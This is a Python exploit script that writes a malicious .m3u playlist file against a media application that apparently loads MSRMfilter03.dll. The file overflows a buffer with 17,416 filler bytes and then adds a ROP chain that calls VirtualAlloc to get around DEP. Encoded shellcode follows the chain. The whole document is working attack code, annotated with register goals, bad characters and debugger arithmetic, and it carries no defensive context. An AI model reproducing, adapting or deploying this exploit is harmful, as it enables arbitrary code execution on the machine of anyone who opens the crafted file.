#!/usr/bin/python
 
import sys, struct
 
file="crash.m3u"
  
#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0A'                                            #
#---------------------------------------------------------------------#
#---------------------------------------------------------------------#
    #GOAL       VirtualAlloc                                         
# EAX 90909090 => Nop  {DONE}                                               
# ECX 00000040 => flProtect     {DONE}                                     
# EDX 00001000 => flAllocationType                                    
# EBX 00000001 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..) {DONE}                     
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of VirtualAlloc (0x1005D060)         
# EDI RETN => ROP-Nop same as EIP (0x10010112)    {DONE}                         
#---------------------------------------------------------------------#

rop_nop = struct.pack("<I",0x10010112) # RETN from MSRMfilter03
shellcode =  b""
shellcode += b"\xdb\xdb\xbf\xf4\x45\x0f\x2d\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x52\x31\x7b\x17\x03\x7b\x17"
shellcode += b"\x83\x1f\xb9\xed\xd8\x23\xaa\x70\x22\xdb\x2b"
shellcode += b"\x15\xaa\x3e\x1a\x15\xc8\x4b\x0d\xa5\x9a\x19"
shellcode += b"\xa2\x4e\xce\x89\x31\x22\xc7\xbe\xf2\x89\x31"
shellcode += b"\xf1\x03\xa1\x02\x90\x87\xb8\x56\x72\xb9\x72"
shellcode += b"\xab\x73\xfe\x6f\x46\x21\x57\xfb\xf5\xd5\xdc"
shellcode += b"\xb1\xc5\x5e\xae\x54\x4e\x83\x67\x56\x7f\x12"
shellcode += b"\xf3\x01\x5f\x95\xd0\x39\xd6\x8d\x35\x07\xa0"
shellcode += b"\x26\x8d\xf3\x33\xee\xdf\xfc\x98\xcf\xef\x0e"
shellcode += b"\xe0\x08\xd7\xf0\x97\x60\x2b\x8c\xaf\xb7\x51"
shellcode += b"\x4a\x25\x23\xf1\x19\x9d\x8f\x03\xcd\x78\x44"
shellcode += b"\x0f\xba\x0f\x02\x0c\x3d\xc3\x39\x28\xb6\xe2"
shellcode += b"\xed\xb8\x8c\xc0\x29\xe0\x57\x68\x68\x4c\x39"
shellcode += b"\x95\x6a\x2f\xe6\x33\xe1\xc2\xf3\x49\xa8\x8a"
shellcode += b"\x30\x60\x52\x4b\x5f\xf3\x21\x79\xc0\xaf\xad"
shellcode += b"\x31\x89\x69\x2a\x35\xa0\xce\xa4\xc8\x4b\x2f"
shellcode += b"\xed\x0e\x1f\x7f\x85\xa7\x20\x14\x55\x47\xf5"
shellcode += b"\xbb\x05\xe7\xa6\x7b\xf5\x47\x17\x14\x1f\x48"
shellcode += b"\x48\x04\x20\x82\xe1\xaf\xdb\x45\xce\x98\xe2"
shellcode += b"\xa9\xa6\xda\xe4\xcb\xb3\x52\x02\x81\xab\x32"
shellcode += b"\x9d\x3e\x55\x1f\x55\xde\x9a\xb5\x10\xe0\x11"
shellcode += b"\x3a\xe5\xaf\xd1\x37\xf5\x58\x12\x02\xa7\xcf"
shellcode += b"\x2d\xb8\xcf\x8c\xbc\x27\x0f\xda\xdc\xff\x58"
shellcode += b"\x8b\x13\xf6\x0c\x21\x0d\xa0\x32\xb8\xcb\x8b"
shellcode += b"\xf6\x67\x28\x15\xf7\xea\x14\x31\xe7\x32\x94"
shellcode += b"\x7d\x53\xeb\xc3\x2b\x0d\x4d\xba\x9d\xe7\x07"
shellcode += b"\x11\x74\x6f\xd1\x59\x47\xe9\xde\xb7\x31\x15"
shellcode += b"\x6e\x6e\x04\x2a\x5f\xe6\x80\x53\xbd\x96\x6f"
shellcode += b"\x8e\x05\xb6\x8d\x1a\x70\x5f\x08\xcf\x39\x02"
shellcode += b"\xab\x3a\x7d\x3b\x28\xce\xfe\xb8\x30\xbb\xfb"
shellcode += b"\x85\xf6\x50\x76\x95\x92\x56\x25\x96\xb6"

#EAX {DONE}
eax = struct.pack("<I",0x1002a649)  # pop eax; ret;  
eax += struct.pack("<I",0x90909090)

#ECX {DONE}
ecx = struct.pack("<I",0x100125e2)  # pop ecx; ret; 
ecx += struct.pack("<I",0xffffffff) # -1
ecx += struct.pack("<I",0x10031d7e)  #0 INC ECX # AND EAX,8 # RETN    ** 
ecx += struct.pack("<I",0x10031d7e)  #1 INC ECX # AND EAX,8 # RETN    ** 
ecx += struct.pack("<I",0x1002a487)  #2 ADD ECX,ECX # RETN    ** [MSRMfilter03.dll] **
ecx += struct.pack("<I",0x1002a487)  #4 ADD ECX,ECX # RETN    ** [MSRMfilter03.dll] **
ecx += struct.pack("<I",0x1002a487)  #8 ADD ECX,ECX # RETN    ** [MSRMfilter03.dll] **
ecx += struct.pack("<I",0x1002a487)  #16 ADD ECX,ECX # RETN    ** [MSRMfilter03.dll] **
ecx += struct.pack("<I",0x1002a487)  #32 ADD ECX,ECX # RETN    ** [MSRMfilter03.dll] **
ecx += struct.pack("<I",0x1002a487)  #64 ADD ECX,ECX # RETN    ** [MSRMfilter03.dll] **

#EDX
edx = struct.pack("<I",0x1003fb3f)  # MOV EDX,0E58B0001 # POP EBP # RETN    ** [MSRMfilter03.dll] **
edx += rop_nop # padding to compensate
edx += struct.pack('<L',0x10013b1c) # POP EBX # RETN
edx += struct.pack('<L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
#0:000> ? 1A750FFF
#Evaluate expression: 443879423 = 1a750fff
#0:000> ? 1`00001000 - 1a750fff
#Evaluate expression: -443875327 = e58b0001
#0:000> ? e58b0001 + 1a750fff
#Evaluate expression: 4294971392 = 00000001`00001000
edx += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
edx += rop_nop # padding to compensate
edx += rop_nop # padding to compensate
edx += rop_nop # padding to compensate
edx += rop_nop # padding to compensate
edx += rop_nop # padding to compensate
edx += rop_nop # padding to compensate


#EBX
ebx = struct.pack('<L',0x10013b1c) # POP EBX # RETN
ebx += struct.pack("<I",0xffffffff) # -1
ebx += struct.pack("<I",0x100319d3) # inc ebx ; fpatan  ; ret  ;
ebx += struct.pack("<I",0x100319d3) # inc ebx ; fpatan  ; ret  ; 

#EBP {DONE}
ebp = struct.pack("<I",0x1001062d)  # pop ebp; ret;
ebp += struct.pack("<I",0x100371f5) # call esp

#ESI
esi = struct.pack("<I",0x1002a649)  # pop eax; ret; 
esi += struct.pack("<I",0x1005D060) # virtual alloc pointer
esi += struct.pack("<I",0x10027f59) #  mov eax, dword [eax] ; ret  ;
esi += struct.pack("<I",0x1005bb8e) # push eax ; add dword [ebp+0x05], esi ; push 0x00000001 ; pop eax ; pop esi ; ret  ;

#EDI{DONE}
edi = struct.pack("<I",0x10012444)  # pop edi; ret;
edi += rop_nop

pushad = struct.pack("<I",0x10014720)  # pushad; ret 

rop = edi  #V
rop += ecx #V
rop += esi #V
rop += edx #V
rop += ebp #V
rop += ebx  #V
rop += eax #V
rop += pushad #V


crash = b"http://." + b"A"*17416 
crash += rop_nop
crash += rop_nop
crash += rop
nops = b"\x90"*5
crash += shellcode
crash += b"C"*7572
 
writeFile = open (file, "wb")
writeFile.write( crash )
writeFile.close()
